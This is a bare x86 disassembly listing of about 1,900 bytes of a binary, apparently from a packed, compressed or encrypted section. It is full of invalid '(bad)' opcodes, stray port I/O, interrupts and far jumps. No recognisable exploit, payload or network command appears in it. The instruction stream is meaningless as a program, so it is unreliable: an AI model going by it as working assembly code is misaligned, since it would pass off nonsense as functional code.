  4125cc:	pop    ebx
  4125cd:	rcl    DWORD PTR [ebx+ebx*4],0x8f
  4125d1:	dec    esi
  4125d2:	mov    bh,0x48
  4125d4:	mov    cl,0x42
  4125d6:	aas    
  4125d7:	mov    ds:0x214816d9,eax
  4125dc:	test   al,0x4e
  4125de:	inc    eax
  4125df:	cmp    ecx,eax
  4125e1:	add    eax,0x7c42e0c5
  4125e6:	cmp    edi,DWORD PTR [edi]
  4125e8:	psubb  mm0,QWORD PTR [edi-0x23]
  4125ec:	adc    DWORD PTR [eax+ecx*8],ebp
  4125ef:	xchg   ebp,eax
  4125f0:	jmp    0x4125a2
  4125f2:	jne    0x41260c
  4125f4:	xchg   ebp,eax
  4125f5:	sbb    DWORD PTR [ebx+0x2aac002b],esi
  4125fb:	leave  
  4125fc:	(bad)  
  4125fe:	dec    ebp
  4125ff:	ret    0x7008
  412602:	cwde   
  412603:	xor    al,0x69
  412605:	ins    BYTE PTR es:[edi],dx
  412606:	shl    DWORD PTR [edi+0x43920ddd],cl
  41260c:	stos   BYTE PTR es:[edi],al
  41260d:	hlt    
  41260e:	xchg   ebx,eax
  41260f:	mov    bh,0x5a
  412611:	mov    edx,0x71676878
  412616:	xor    BYTE PTR [eax+0x11ee2bc9],dl
  41261c:	cmc    
  41261d:	outs   dx,BYTE PTR ds:[esi]
  41261e:	mov    ecx,eax
  412620:	inc    ecx
  412621:	dec    ecx
  412622:	xchg   BYTE PTR [ebp-0x2595a3b1],cl
  412628:	idiv   ecx
  41262a:	cli    
  41262b:	push   0xc07906c3
  412630:	add    eax,0xbd3e1671
  412635:	rcl    DWORD PTR [esi+ebp*1+0x75],1
  412639:	jno    0x4125dd
  41263b:	cmp    ebx,eax
  41263d:	pushf  
  41263e:	int    0x5b
  412640:	lock in eax,0x1
  412643:	fnstsw WORD PTR ds:0x1cf3eaf
  412649:	fstp   DWORD PTR [eax]
  41264b:	mov    ecx,DWORD PTR [edx]
  41264d:	mov    ?,edx
  41264f:	ret    0xf2ca
  412652:	shl    BYTE PTR [edi*2+0x5383b65d],1
  412659:	inc    ebp
  41265a:	rcr    BYTE PTR [eax*1-0x55c87ead],1
  412661:	or     eax,0xfd4235d9
  412666:	cmp    DWORD PTR [esi+0xb9817be],ebp
  41266c:	cmp    eax,0xfb0b7a95
  412671:	test   eax,0x789275d4
  412676:	(bad)  
  412677:	push   ss
  412678:	mov    BYTE PTR [edi+edi*1+0xb0ac778],cl
  41267f:	das    
  412680:	mov    dh,dl
  412682:	mov    bh,0x2f
  412684:	stos   BYTE PTR es:[edi],al
  412685:	mov    eax,0x36e165be
  41268a:	test   eax,0x788dd3b6
  41268f:	mov    DWORD PTR [eax+0x12],edx
  412692:	xchg   edx,eax
  412693:	(bad)  
  412695:	xchg   edx,eax
  412696:	lea    edx,[ebp-0x29cb8ff8]
  41269c:	cdq    
  41269d:	xor    al,0x88
  41269f:	cmp    al,0xb0
  4126a1:	mov    ss,edi
  4126a3:	push   esp
  4126a4:	push   esp
  4126a5:	test   BYTE PTR [ebx+0x35c782b],0xc8
  4126ac:	jl     0x4126c5
  4126ae:	das    
  4126af:	push   es
  4126b0:	jnp    0x412709
  4126b2:	in     al,dx
  4126b3:	mov    ds:0x854a3c3,al
  4126b8:	dec    esi
  4126b9:	jae    0x412717
  4126bb:	fcomp  DWORD PTR [edx+0x22]
  4126be:	fdivr  QWORD PTR [edx+0x207b7979]
  4126c4:	add    dh,BYTE PTR [esi+0x8]
  4126c7:	xchg   edi,eax
  4126c8:	and    ebp,ebp
  4126ca:	sbb    eax,0xdebf33e4
  4126cf:	adc    esp,DWORD PTR [ebx-0x4fbfbb82]
  4126d5:	and    ebx,DWORD PTR [ebx+esi*1-0x4f]
  4126d9:	inc    edi
  4126da:	xchg   esp,eax
  4126db:	lds    eax,FWORD PTR [edx+0x77e2e27c]
  4126e1:	pushf  
  4126e2:	mov    esi,0x90b537f1
  4126e7:	jmp    0x90e6:0xdcd50195
  4126ee:	inc    eax
  4126ef:	ficom  WORD PTR [ecx+0x69a80cb5]
  4126f5:	outs   dx,DWORD PTR ds:[esi]
  4126f6:	out    dx,al
  4126f7:	out    dx,eax
  4126f8:	mov    esp,ds
  4126fa:	pop    ss
  4126fb:	je     0x412710
  4126fd:	cmp    eax,0x3066793f
  412702:	mov    ch,0x14
  412704:	pop    esp
  412705:	ficomp WORD PTR [eax-0x7db46d2f]
  41270b:	inc    ebp
  41270c:	cmp    edx,DWORD PTR [esp+ebp*2-0x2b8d8e89]
  412713:	loope  0x4126b1
  412715:	and    al,0x87
  412717:	jns    0x412715
  412719:	or     BYTE PTR [edx-0x54],ch
  41271c:	xchg   ecx,eax
  41271d:	push   ds
  41271e:	hlt    
  41271f:	(bad)
  412722:	(bad)  
  412723:	leave  
  412724:	in     eax,0xbb
  412726:	popf   
  412727:	lods   eax,DWORD PTR ds:[esi]
  412728:	push   es
  412729:	sbb    eax,0x6519a1e4
  41272e:	in     al,dx
  41272f:	mov    esi,0x2dd3554
  412734:	aaa    
  412735:	fucompp 
  412737:	lea    eax,[esi+0x22]
  41273a:	(bad)  
  41273b:	int    0xbc
  41273d:	add    BYTE PTR [ebx+0x1a],dh
  412740:	test   DWORD PTR [edx+0x1163c6d1],esp
  412746:	cmp    BYTE PTR [edi+0xb8d9d06],ch
  41274c:	push   esi
  41274d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41274e:	inc    esi
  41274f:	xor    al,0x4b
  412751:	xchg   edi,eax
  412752:	scas   al,BYTE PTR es:[edi]
  412753:	add    esi,DWORD PTR [esi]
  412755:	div    BYTE PTR [edi-0x6bb76a0c]
  41275b:	mov    dl,0x29
  41275d:	sbb    al,0x44
  41275f:	and    ch,BYTE PTR [edx-0x4f8a6e38]
  412765:	les    edx,FWORD PTR [eax+0x17]
  412768:	sub    DWORD PTR [ebx],0x37
  41276b:	(bad)  [ebx+0x39]
  41276e:	cs push esp
  412770:	inc    ebx
  412771:	and    esp,DWORD PTR [eax+0x2232bc23]
  412777:	aad    0xce
  412779:	pop    edx
  41277a:	cmp    edx,0xffffffaa
  41277d:	cmp    al,0x8d
  41277f:	loop   0x41270e
  412781:	outs   dx,BYTE PTR ds:[esi]
  412782:	ret    
  412783:	div    esp
  412785:	push   esp
  412786:	xlat   BYTE PTR ds:[ebx]
  412787:	fadd   DWORD PTR [ebp-0x44]
  41278a:	jp     0x412719
  41278c:	int    0xe1
  41278e:	dec    esp
  41278f:	dec    esi
  412790:	mov    ds:0x41a624a7,eax
  412795:	mov    es,WORD PTR [ebx+0x40b258c6]
  41279b:	mov    ebx,0x93875a82
  4127a0:	pop    ebp
  4127a1:	mov    al,0xb3
  4127a3:	cmp    DWORD PTR [esi+0x6],ecx
  4127a6:	daa    
  4127a7:	fldcw  WORD PTR [edi-0x5d]
  4127aa:	fistp  WORD PTR ss:[esi+0x69de5d64]
  4127b1:	push   ds
  4127b2:	dec    esi
  4127b3:	mov    edx,0x913f1ff1
  4127b8:	ss je  0x4127e3
  4127bb:	xor    DWORD PTR [edx],esp
  4127bd:	in     eax,0x84
  4127bf:	punpcklwd mm2,DWORD PTR ds:0x9e277f77
  4127c6:	mov    dh,0xe2
  4127c8:	mov    bh,0x87
  4127ca:	sbb    al,0x1d
  4127cc:	jae    0x41279f
  4127ce:	jmp    0x412797
  4127d0:	jb     0x412829
  4127d2:	fmul   DWORD PTR [ebx+edi*1+0x65cde91a]
  4127d9:	mov    ah,0x34
  4127db:	sbb    bl,dl
  4127dd:	pop    esp
  4127de:	push   cs
  4127df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127e0:	push   ecx
  4127e1:	or     BYTE PTR [ebx],ah
  4127e3:	aam    0x76
  4127e5:	mov    dh,0xd1
  4127e7:	retf   0x3f04
  4127ea:	out    dx,al
  4127eb:	jl     0x412859
  4127ed:	out    dx,al
  4127ee:	enter  0x5624,0x56
  4127f2:	cli    
  4127f3:	hlt    
  4127f4:	cdq    
  4127f5:	mov    esi,0xf248bae3
  4127fa:	push   ss
  4127fb:	aas    
  4127fc:	sub    cl,ah
  4127fe:	test   BYTE PTR [ebp-0x3f],dl
  412801:	ds test al,0x76
  412804:	out    dx,eax
  412805:	and    al,0x91
  412807:	test   eax,0xae28a049
  41280c:	mov    dl,0xe7
  41280e:	test   BYTE PTR [esi+0x62f32e5a],dh
  412814:	repz pop eax
  412816:	pop    ecx
  412817:	and    bl,dh
  412819:	push   ebx
  41281a:	inc    edx
  41281b:	mov    al,0xe2
  41281d:	dec    ecx
  41281e:	dec    DWORD PTR [ecx-0x5546e0ea]
  412824:	dec    ebx
  412825:	cld    
  412826:	(bad)  
  412827:	mov    eax,ds:0x5bdf9118
  41282c:	daa    
  41282d:	aam    0x32
  41282f:	jne    0x412850
  412831:	push   edi
  412832:	retf   
  412833:	adc    BYTE PTR [edx],al
  412835:	jg     0x4127c2
  412837:	mov    esp,0x92dab866
  41283c:	iret   
  41283d:	mov    bl,0x8c
  41283f:	out    dx,al
  412840:	into   
  412841:	jns    0x4127ed
  412843:	sahf   
  412844:	or     BYTE PTR [ebx-0x4239f52],bh
  41284a:	sbb    bh,bl
  41284c:	cmp    ch,BYTE PTR [ebx+ebp*1+0x1c]
  412850:	shl    DWORD PTR [esi+eax*1+0x2b078b80],1
  412857:	nop
  412858:	or     bl,BYTE PTR [ebp-0x5a]
  41285b:	ret    0x244a
  41285e:	and    al,0x5b
  412860:	mov    BYTE PTR [eax],cl
  412862:	ffreep st(0)
  412864:	lods   eax,DWORD PTR ds:[esi]
  412865:	sahf   
  412866:	int    0x98
  412868:	mov    cl,0x22
  41286a:	dec    eax
  41286b:	out    dx,eax
  41286c:	jae    0x412853
  41286e:	cmp    BYTE PTR [eax+0xe],ch
  412871:	cmp    al,0x64
  412873:	jp     0x41280e
  412875:	icebp  
  412876:	rcr    BYTE PTR [edx],cl
  412878:	(bad)  
  412879:	loop   0x4128ad
  41287b:	pop    esp
  41287c:	dec    esp
  41287d:	dec    ebp
  41287e:	xchg   BYTE PTR [ebp+ecx*4+0x14],bh
  412882:	int    0x2f
  412884:	(bad)  
  412886:	mov    edi,0x6545d9a0
  41288b:	cli    
  41288c:	xor    eax,0x3ce791d7
  412891:	inc    esp
  412892:	mov    WORD PTR ds:0x658dea03,ds
  412898:	fbld   TBYTE PTR [ebx-0x7d]
  41289b:	add    DWORD PTR [edx-0x4caf37b2],ebp
  4128a1:	or     eax,0xccf931bf
  4128a6:	inc    ebp
  4128a7:	mov    ah,0xb6
  4128a9:	hlt    
  4128aa:	mov    al,ds:0x22581603
  4128af:	test   al,0xc2
  4128b1:	sbb    eax,0xa6a88d4
  4128b6:	push   ds
  4128b7:	imul   esi,DWORD PTR [eax-0x6db11975],0x1e
  4128be:	fld    QWORD PTR [ebp+edi*1-0x39]
  4128c2:	pop    ss
  4128c3:	xchg   ecx,eax
  4128c4:	dec    eax
  4128c5:	pop    esp
  4128c6:	push   ax
  4128c8:	and    eax,0x30ca38eb
  4128cd:	push   cs
  4128ce:	data16 cli 
  4128d0:	aaa    
  4128d1:	mov    ecx,0xe5e04ae2
  4128d6:	add    BYTE PTR [edx+0x1590f06f],ch
  4128dc:	mov    esp,0xc051013e
  4128e1:	sahf   
  4128e2:	mov    bh,0x51
  4128e4:	popf   
  4128e5:	mov    cl,0x78
  4128e7:	cmp    eax,0xff32691d
  4128ec:	sbb    esi,DWORD PTR [edx-0x270324ff]
  4128f2:	imul   edi,DWORD PTR [eax+0x64],0xa5c28f8f
  4128f9:	dec    ebp
  4128fa:	dec    cx
  4128fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128fd:	dec    esi
  4128fe:	push   ecx
  4128ff:	int    0x5e
  412901:	inc    edx
  412902:	out    0x94,eax
  412904:	mov    al,0x35
  412906:	fistp  QWORD PTR [ebx+0x3a]
  412909:	lock repnz sub cl,BYTE PTR [edx+0x7a]
  41290e:	and    al,0x2c
  412910:	adc    esi,DWORD PTR gs:[esi-0x23ba83b9]
  412917:	pop    ss
  412918:	and    BYTE PTR [ecx],ah
  41291a:	lea    ebx,[ebx-0x40]
  41291d:	xchg   ebp,eax
  41291e:	xchg   WORD PTR [edi+ecx*8+0x6eae0f7],si
  412926:	(bad)  
  412927:	jmp    0x4128d7
  412929:	in     eax,dx
  41292a:	in     eax,dx
  41292b:	cmp    al,0xa6
  41292d:	push   eax
  41292e:	cmp    ebx,DWORD PTR [ebx-0x43]
  412931:	imul   ebp,esp,0x453d2b44
  412937:	data16 test bh,cl
  41293a:	ja     0x4128fc
  41293c:	enter  0x2473,0xa0
  412940:	dec    esi
  412941:	jmp    0x9648:0x8d0dcbce
  412948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412949:	repnz addr16 push ecx
  41294c:	inc    edi
  41294d:	int    0xb
  41294f:	push   cs
  412950:	push   ecx
  412951:	sbb    eax,0x696c09e2
  412956:	cmp    eax,0xc2aec265
  41295b:	xchg   bl,ch
  41295d:	scas   al,BYTE PTR es:[edi]
  41295e:	jg     0x412971
  412960:	lahf   
  412961:	lock dec eax
  412963:	jmp    0x2b0b870f
  412968:	cmp    DWORD PTR [eax],0xfffffff4
  41296b:	pop    ds
  41296c:	sub    BYTE PTR [esp+0x1fe5c43b],0x9
  412974:	push   ebp
  412975:	and    eax,0xf46c17d6
  41297a:	pop    esi
  41297b:	or     ah,BYTE PTR [edi]
  41297d:	xor    eax,DWORD PTR [eax-0x147f31fb]
  412983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412984:	mov    ecx,0x90dde6d5
  412989:	mov    ebp,0x964c0ea1
  41298e:	call   0xa839:0x93f8b62d
  412995:	cwde   
  412996:	xor    ch,bl
  412998:	mov    BYTE PTR [ecx*2-0x2661a50c],0xc2
  4129a0:	or     al,BYTE PTR [ebp+edx*1+0x24]
  4129a4:	jl     0x41295d
  4129a6:	inc    edi
  4129a7:	pop    ds
  4129a8:	xchg   ebx,eax
  4129a9:	or     eax,0x5d77f61c
  4129ae:	aaa    
  4129af:	loopne 0x4129ca
  4129b1:	or     eax,0x7e3954b1
  4129b6:	ret    0x4f25
  4129b9:	scas   eax,DWORD PTR es:[edi]
  4129ba:	retf   0xc89a
  4129bd:	mov    WORD PTR [ecx+eax*8-0x8],?
  4129c1:	fst    DWORD PTR [ebp+0x29]
  4129c4:	idiv   DWORD PTR [eax+0x7d]
  4129c7:	in     al,0xf4
  4129c9:	leave  
  4129ca:	inc    esi
  4129cb:	cmc    
  4129cc:	scas   al,BYTE PTR es:[edi]
  4129cd:	dec    esp
  4129ce:	or     al,0xd6
  4129d0:	mov    ecx,0xe990a295
  4129d5:	adc    ah,BYTE PTR [eax]
  4129d7:	mov    DWORD PTR [edi],esi
  4129d9:	sbb    al,0x24
  4129db:	stos   DWORD PTR es:[edi],eax
  4129dc:	lods   eax,DWORD PTR ds:[esi]
  4129dd:	aaa    
  4129de:	push   cs
  4129df:	jl     0x412a2a
  4129e1:	inc    eax
  4129e2:	cmp    esi,DWORD PTR [edx-0x50584373]
  4129e8:	xor    eax,0x3c94a651
  4129ed:	cwde   
  4129ee:	jl     0x4129e0
  4129f0:	inc    edi
  4129f1:	push   esp
  4129f2:	and    cl,0xda
  4129f5:	adc    al,0x7e
  4129f7:	es xchg ecx,eax
  4129f9:	dec    esi
  4129fa:	mov    BYTE PTR [edx+edi*1],al
  4129fd:	mov    cl,0xe7
  4129ff:	dec    esp
  412a00:	sub    al,0xb5
  412a03:	jle    0x4129e7
  412a05:	es adc eax,0xf65ba5eb
  412a0b:	dec    ebx
  412a0c:	jle    0x412a87
  412a0e:	dec    ebx
  412a0f:	pop    es
  412a10:	adc    ebp,DWORD PTR [ebx+0x2e]
  412a13:	mov    al,0x96
  412a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a16:	mov    ds:0x233e5dd4,al
  412a1b:	in     al,dx
  412a1c:	mov    dl,0xb0
  412a1e:	push   ss
  412a1f:	(bad)  
  412a20:	mov    ds:0x9f3a617d,al
  412a25:	pop    ss
  412a26:	xchg   DWORD PTR [edi+ebp*1-0x4e],ecx
  412a2a:	pop    edi
  412a2b:	xchg   ebx,eax
  412a2c:	dec    ebx
  412a2d:	pop    es
  412a2e:	inc    eax
  412a2f:	frstor [edx+0x3cdfdacb]
  412a35:	and    DWORD PTR [eax-0x67],ecx
  412a38:	pusha  
  412a39:	shl    DWORD PTR [ecx+0x68a5cfda],0x38
  412a40:	add    bh,BYTE PTR [ebp-0x21]
  412a43:	lods   al,BYTE PTR ds:[esi]
  412a44:	gs jb  0x4129db
  412a47:	mov    BYTE PTR [edi-0x6b],ah
  412a4a:	div    BYTE PTR [edi+0x5f]
  412a4d:	enter  0xecc,0x8c
  412a51:	xor    al,0xd8
  412a53:	test   DWORD PTR [ebx],edx
  412a55:	(bad)  
  412a57:	pop    esp
  412a58:	out    0x2,al
  412a5a:	cdq    
  412a5b:	jecxz  0x412a3a
  412a5d:	xor    eax,0xf5204953
  412a62:	lds    ecx,FWORD PTR [ebp+0x1a]
  412a65:	clc    
  412a66:	cmp    bl,bh
  412a68:	pop    ecx
  412a69:	fwait
  412a6a:	(bad)  
  412a6b:	cmc    
  412a6c:	sbb    DWORD PTR ds:0xde8fee65,edx
  412a72:	sar    eax,cl
  412a74:	push   ds
  412a75:	add    esp,ecx
  412a77:	in     al,dx
  412a78:	mul    DWORD PTR [esi+0x6e]
  412a7b:	adc    BYTE PTR [edi],bh
  412a7d:	shl    al,cl
  412a7f:	lods   eax,DWORD PTR ds:[esi]
  412a80:	jl     0x412a9b
  412a82:	xchg   dh,dh
  412a84:	mov    ebx,0xb1f7f2d2
  412a89:	inc    esp
  412a8a:	push   edi
  412a8b:	(bad)  
  412a8c:	mov    esi,0xa03bd175
  412a91:	stos   DWORD PTR es:[edi],eax
  412a92:	or     esi,eax
  412a94:	xchg   ebx,eax
  412a95:	inc    eax
  412a96:	int3   
  412a97:	sbb    eax,0x325b56ea
  412a9c:	lods   eax,DWORD PTR ds:[esi]
  412a9d:	shl    DWORD PTR [ebp+0x5900a258],cl
  412aa3:	lods   eax,DWORD PTR ds:[esi]
  412aa4:	mov    edx,0x8e571ea7
  412aa9:	les    eax,FWORD PTR [ebx+0x3979e35]
  412aaf:	aad    0xca
  412ab1:	(bad)  
  412ab2:	push   ds
  412ab3:	mov    ecx,0x80ff3fa4
  412ab8:	mov    al,ds:0x4cc72411
  412abd:	pop    edx
  412abe:	sbb    al,0x87
  412ac0:	fsubr  DWORD PTR [ebx]
  412ac2:	sbb    eax,0x2c0efe0
  412ac7:	stc    
  412ac8:	test   ebp,ebp
  412aca:	inc    esi
  412acb:	push   edx
  412acc:	push   esp
  412acd:	inc    ebp
  412ace:	mov    eax,0xd4c77121
  412ad3:	fstp   QWORD PTR [edx-0x62b5a789]
  412ad9:	mov    dl,0xf0
  412adb:	add    eax,0x64e8c584
  412ae0:	pop    eax
  412ae1:	xchg   edx,eax
  412ae2:	mov    dh,0xec
  412ae4:	clc    
  412ae5:	push   ss
  412ae6:	sbb    esp,eax
  412ae8:	fsubr  st,st(5)
  412aea:	add    ah,dh
  412aec:	xchg   DWORD PTR [edi-0x41],edx
  412aef:	rcr    BYTE PTR [edi],cl
  412af1:	das    
  412af2:	loopne 0x412ad7
  412af4:	dec    edx
  412af5:	pusha  
  412af6:	lea    ebp,[edx+0x3f]
  412af9:	int3   
  412afa:	sub    edi,DWORD PTR [edx+edx*8+0x62]
  412afe:	pop    esi
  412aff:	xchg   edx,eax
  412b00:	call   DWORD PTR [ecx-0x2ec08aa6]
  412b06:	(bad)  
  412b07:	test   eax,0xa8562b3e
  412b0c:	clc    
  412b0d:	fldln2 
  412b0f:	ins    DWORD PTR es:[edi],dx
  412b10:	mov    ebx,0x4e033809
  412b15:	jns    0x412ae9
  412b17:	in     al,dx
  412b18:	aaa    
  412b19:	mov    ah,bh
  412b1b:	test   al,0xc9
  412b1d:	mov    al,ds:0xe4b4dea0
  412b22:	push   eax
  412b23:	repnz stos BYTE PTR es:[edi],al
  412b25:	adc    DWORD PTR [ebx],eax
  412b27:	ja     0x412b48
  412b29:	jp     0x412ac7
  412b2b:	cli    
  412b2c:	dec    esi
  412b2d:	fmul   st,st(4)
  412b2f:	push   ds
  412b30:	pop    ebp
  412b31:	dec    ebx
  412b32:	nop
  412b33:	dec    ebp
  412b34:	mov    WORD PTR [esi],?
  412b36:	xlat   BYTE PTR ds:[ebx]
  412b37:	mov    al,ds:0x3231272b
  412b3c:	jl     0x412b3d
  412b3e:	inc    edx
  412b3f:	neg    BYTE PTR [ebx]
  412b41:	dec    ebx
  412b42:	sub    al,0x7f
  412b44:	add    DWORD PTR [ebx+0x57],edx
  412b47:	cmp    eax,0xb2797451
  412b4c:	jg     0x412b40
  412b4e:	aad    0xbf
  412b50:	pop    ebp
  412b51:	cmp    ebp,ebx
  412b53:	mov    ss,WORD PTR [eax-0x2f]
  412b56:	mov    bl,0xc7
  412b58:	and    BYTE PTR [esi+0x14],ah
  412b5b:	add    DWORD PTR [edi],ebx
  412b5d:	xchg   ebp,eax
  412b5e:	and    ch,ch
  412b60:	dec    edi
  412b61:	xchg   ebp,eax
  412b62:	or     ecx,DWORD PTR [esi-0x85e1ac2]
  412b68:	mov    BYTE PTR [eax-0x1b],dl
  412b6b:	xor    al,0xda
  412b6d:	js     0x412b0f
  412b6f:	xor    al,0x5
  412b71:	sub    DWORD PTR [esp+ecx*4+0x3b],ebx
  412b75:	inc    esp
  412b76:	out    dx,eax
  412b77:	sub    edi,DWORD PTR [edi-0x22f34de9]
  412b7d:	sbb    bl,BYTE PTR ds:0xee0f3b0e
  412b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b84:	mov    DWORD PTR [eax-0x4ce7dcd],edx
  412b8a:	cmp    eax,DWORD PTR [edx]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	test   BYTE PTR [edi],dh
  412b8f:	sbb    al,0x58
  412b91:	and    BYTE PTR [ebx-0x5c917eee],ch
  412b97:	add    ecx,DWORD PTR [ebp-0x68]
  412b9a:	push   0x21e8c118
  412b9f:	dec    ecx
  412ba0:	lods   al,BYTE PTR ds:[esi]
  412ba1:	(bad)  
  412ba3:	sbb    cl,BYTE PTR [ebp+0x39]
  412ba6:	leave  
  412ba7:	mov    bh,BYTE PTR [eax]
  412ba9:	cs test eax,0x61005d8
  412baf:	jnp    0x412b8b
  412bb1:	sub    esi,eax
  412bb3:	in     eax,0x4b
  412bb5:	ffreep st(1)
  412bb7:	jnp    0x412c37
  412bb9:	and    al,0xd5
  412bbb:	pop    ecx
  412bbc:	or     bh,BYTE PTR [ebx-0x35]
  412bbf:	fnstsw WORD PTR [ecx+esi*1-0x19]
  412bc3:	scas   al,BYTE PTR es:[edi]
  412bc4:	mov    cl,0xdb
  412bc6:	outs   dx,DWORD PTR ds:[esi]
  412bc7:	or     DWORD PTR [bp+0x6112],ecx
  412bcc:	mov    ds:0x5449f0e0,al
  412bd1:	jne    0x412b95
  412bd3:	outs   dx,BYTE PTR ds:[esi]
  412bd4:	retf   0x9563
  412bd7:	(bad)  
  412bd8:	jp     0x412bb5
  412bda:	stc    
  412bdb:	mov    ebx,0xb56cc2c3
  412be1:	or     dh,BYTE PTR [ebp-0x1f7c96e3]
  412be7:	mov    dl,0x5f
  412be9:	xlat   BYTE PTR ds:[ebx]
  412bea:	pop    edi
  412beb:	shl    BYTE PTR [ebx-0x64],1
  412bee:	repz std 
  412bf0:	xor    eax,0x67ad18ad
  412bf5:	lock xchg al,ah
  412bf8:	and    eax,0x42bddecf
  412bfd:	clc    
  412bfe:	dec    ecx
  412bff:	inc    edx
  412c00:	addr16 mov al,0x2d
  412c03:	bound  edx,QWORD PTR [esi]
  412c05:	push   esp
  412c06:	in     al,dx
  412c07:	fsubr  st(5),st
  412c09:	(bad)  
  412c0a:	cmp    eax,0xaf5c1022
  412c0f:	fs out dx,al
  412c11:	aas    
  412c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c13:	sbb    edi,esi
  412c15:	push   ecx
  412c16:	xor    BYTE PTR [edx-0x481feec3],0x7a
  412c1d:	aaa    
  412c1e:	(bad)  
  412c1f:	pop    esp
  412c20:	shl    DWORD PTR [ecx-0x2d],0x3f
  412c24:	xor    cl,bh
  412c26:	out    dx,eax
  412c27:	in     al,dx
  412c28:	mov    ch,0x3f
  412c2a:	arpl   WORD PTR [ebp-0x8],sp
  412c2d:	and    eax,0xfe232642
  412c32:	dec    ebx
  412c33:	call   0x6b41:0x50d04e31
  412c3a:	mov    cl,0x19
  412c3c:	mov    ecx,0x59c9c22a
  412c41:	sbb    BYTE PTR [edi-0x76],ch
  412c44:	xor    al,0xa9
  412c46:	pop    es
  412c47:	fdivr  QWORD PTR [esi]
  412c49:	mov    ecx,0x1363ce3b
  412c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c4f:	sar    BYTE PTR [edx+ebx*8],cl
  412c52:	mov    eax,0xaad6cf5d
  412c57:	sbb    al,0x3b
  412c59:	xor    edx,DWORD PTR [esi+eax*4+0x17]
  412c5d:	pop    ds
  412c5e:	add    eax,0xca66267d
  412c63:	xchg   ebp,eax
  412c64:	or     al,0x39
  412c66:	pop    esp
  412c67:	push   esi
  412c68:	add    eax,DWORD PTR [ecx]
  412c6a:	clc    
  412c6b:	loopne 0x412caa
  412c6d:	sbb    eax,0x5521ac3d
  412c72:	mov    WORD PTR [edx],?
  412c74:	(bad)  
  412c75:	jmp    0x8625:0x37842aa4
  412c7c:	mov    bh,0x9a
  412c7e:	and    bh,BYTE PTR [ebx]
  412c80:	cdq    
  412c81:	fs push 0xffffff86
  412c84:	aam    0xbd
  412c86:	fst    DWORD PTR [edx+0x47451150]
  412c8c:	sbb    bl,cl
  412c8e:	rol    DWORD PTR [ecx-0x5cf3302e],cl
  412c94:	sub    eax,0x3b9b5930
  412c99:	cdq    
  412c9a:	mov    ds,WORD PTR [edx-0x548d6e0b]
  412ca0:	or     al,0x12
  412ca2:	fst    QWORD PTR [eax-0xc]
  412ca5:	adc    eax,0x30c1e25a
  412caa:	mov    ah,0xb8
  412cac:	mov    eax,0x1ea42463
  412cb1:	fiadd  DWORD PTR [eax]
  412cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb4:	into   
  412cb5:	xor    DWORD PTR [ecx-0x56e5fc9c],ebp
  412cbb:	dec    ebp
  412cbc:	pop    edx
  412cbd:	jecxz  0x412d05
  412cbf:	scas   al,BYTE PTR es:[edi]
  412cc0:	fnstsw WORD PTR [ecx-0x140d0f20]
  412cc6:	mov    al,0x58
  412cc8:	cmp    ah,cl
  412cca:	xor    BYTE PTR [edi-0x17338b69],0x8d
  412cd1:	retf   
  412cd2:	sub    BYTE PTR [esi-0x1a3aa401],cl
  412cd8:	mov    esi,ss
  412cda:	scas   al,BYTE PTR es:[edi]
  412cdb:	mov    ss,WORD PTR [edi+0x70]
  412cde:	xchg   ecx,eax
  412cdf:	stos   BYTE PTR es:[edi],al
  412ce0:	fwait
  412ce1:	inc    eax
  412ce2:	sub    al,0x90
  412ce4:	inc    edx
  412ce5:	xor    al,0x9a
  412ce7:	xchg   BYTE PTR [edi+0xb],cl
  412cea:	cmp    al,0x14
  412cec:	mov    ebp,0x532ce35e
  412cf1:	(bad)  
  412cf3:	xor    edi,DWORD PTR [eax+0x2751fa98]
  412cf9:	imul   edx,DWORD PTR [edx],0x10
  412cfc:	mov    ecx,0x7e88957d
  412d01:	dec    esi
  412d02:	mov    ch,0xa4
  412d04:	sub    BYTE PTR [ecx+0x697597ea],bh
  412d0a:	push   0xffffffc5
  412d0c:	stos   DWORD PTR es:[edi],eax
  412d0d:	js     0x412d45
  412d0f:	push   ecx
  412d10:	mov    ebx,0x8feed2b4
  412d15:	adc    esp,edx
  412d17:	xor    al,ah
  412d19:	push   ecx
  412d1a:	adc    esp,ecx
  412d1c:	mov    dl,0xd2
  412d1e:	shl    ebx,cl
  412d20:	(bad)  
  412d21:	sub    DWORD PTR [eax],ebx
  412d23:	adc    ch,BYTE PTR [ebp+0x15cbc30]
  412d29:	jg     0x412cf1
  412d2b:	mov    ah,0x9f
  412d2d:	xor    bl,0x49
  412d30:	jbe    0x412d55
  412d32:	fadd   st(5),st
  412d34:	sbb    ecx,DWORD PTR [eax+0x15]
  412d37:	(bad)  [ebp+0x4ecb7e2d]
  412d3d:	add    ecx,eax
  412d3f:	sbb    eax,DWORD PTR [eiz*1-0x3adc09ee]
  412d46:	xchg   DWORD PTR [edi+ecx*4+0x5f],esp
  412d4a:	aad    0x53
  412d4c:	fld    QWORD PTR [edi]
  412d4e:	adc    ah,al
  412d50:	adc    BYTE PTR ss:[ebx],dh
  412d53:	mov    dl,0xd3
  412d55:	jecxz  0x412d3d
  412d57:	frstor [esi-0x50fcd29]
  412d5d:	mov    ecx,DWORD PTR [ebp+0x572ca271]
  412d63:	push   0xd2fc5668
  412d68:	pop    ds
  412d69:	ret    0xf688
  412d6c:	leave  
  412d6d:	(bad)  
  412d6e:	clc    
  412d6f:	or     eax,0xa4cfdd31
  412d74:	test   BYTE PTR [ebp+0x5180a7ea],dl
  412d7a:	sar    eax,cl
  412d7c:	js     0x412dd1
  412d7e:	push   eax
  412d7f:	cli    
  412d80:	sub    DWORD PTR [ecx],eax
  412d82:	or     al,0xbe
  412d84:	aas    
  412d85:	ins    DWORD PTR es:[edi],dx
  412d86:	lods   al,BYTE PTR ds:[esi]
  412d87:	in     al,0x67
  412d89:	push   eax
  412d8a:	adc    ebx,DWORD PTR [edx-0x3ee0fb41]
  412d90:	sti    
  412d91:	lahf   
